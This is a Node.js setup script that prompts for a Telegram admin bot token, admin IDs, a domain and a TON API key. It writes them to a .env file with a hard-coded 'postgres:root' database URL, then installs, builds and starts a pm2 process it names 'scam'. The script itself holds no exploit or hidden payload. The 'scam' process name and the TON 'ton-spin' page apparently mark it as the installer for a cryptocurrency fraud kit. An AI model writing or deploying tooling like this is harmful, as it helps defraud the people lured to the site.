const readline = require('node:readline');
const fs = require("fs");
const Path = require("path");
const child_process = require("node:child_process");
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

const here = process.cwd();

/**
 *
 * @param msg {string}
 * @returns {Promise<string>}
 */
async function input(msg) {
    return new Promise(r => {
        rl.question("\n"+msg+"\n", e => {
            r(e);
        });
    })
}

const envPath = Path.join(here,'.env');

function getEnv() {
    try {
        const content = fs.readFileSync(envPath).toString('utf-8');

        let R = {};

        for (let line of content.split("\n").filter(Boolean)) {
            let [key, value] = line.split("=");
            key = key.trim();
            value = value.trim();
            if (!key || !value || key.startsWith('#')) continue;

            R[key] = value;
        }

        return R;
    } catch {
        return {};
    }
}

async function setEnv(env) {
    const content = Object.entries(env).map(([k,v]) => `${k}=${v}`).join("\n");

    if (!(await input(`The Env File will be like this:\n\n${content}\n\nAre you continue? (y/n)`)).toLowerCase().startsWith("y")) throw("Canceled");

    fs.writeFileSync(envPath, content);
}

async function main() {
    try {
        console.log("Setting up variables...");

        try {
            fs.mkdirSync(Path.join(here, 'config'));
        } catch {}

        let env = getEnv();

        env.DATABASE_URL = "postgresql://postgres:root@localhost:5432/mydb"
        env.ADMIN = await input("Enter Admin Bot token and press enter");

        let ADMINS = (env.ADMINS || "").split(" ").map(s=>+s).filter(Boolean);

        do {
            const adminId = await input(`Enter Admin id ${ADMINS.length + 1} (type end or leave empty for end circle)`);
            if (!adminId || adminId.toLowerCase() === 'cancel' || adminId.toLowerCase() === 'end') break;

            if (isNaN(+adminId)) {
                console.error('Invalid admin id, its should be admin number id based on telegram');
            } else {
                ADMINS.push(+adminId);
            }
        } while (true);
        env.ADMINS = ADMINS.join(" ");
        console.log(`${ADMINS.length} has been added to admin whitelist`);

        const inputUrl = await input("Enter your domain address (google.com)");
        const url = new URL("https://localhost/ton-spin/index.html");
        url.hostname = inputUrl;
        env.WEB_ORIGIN = url.toString();

        env.TON_API = await input("Enter ton api key (get it from @tonapibot)");

        await setEnv(env);

        console.log("Variable setup finished!");
        const commands = `
        npm install
        npx prisma db push
        npm run build
        npx pm2 start scam
        `.trim()

        const cmds = commands.split("\n").map(s=>s.trim());

        for (let cmd of cmds) {
            try {
                console.warn(`Execute ${cmd}`);
                const test = child_process.execSync(cmd, {
                    timeout: 999999
                });
                console.log(test.toString('utf-8'));
                console.info(`${cmd} END`);
            } catch (e) {
                console.error(e)
            }
        }

        console.warn('================\n\nif admin bot doesn\'t work try running\npm2 restart scam\n\n=============')
    } catch (e) {
        console.error(e);
        console.log("Retry...");
        return await main();
    }
}


main().catch(console.error).finally(()=>{
    process.exit(0);
})
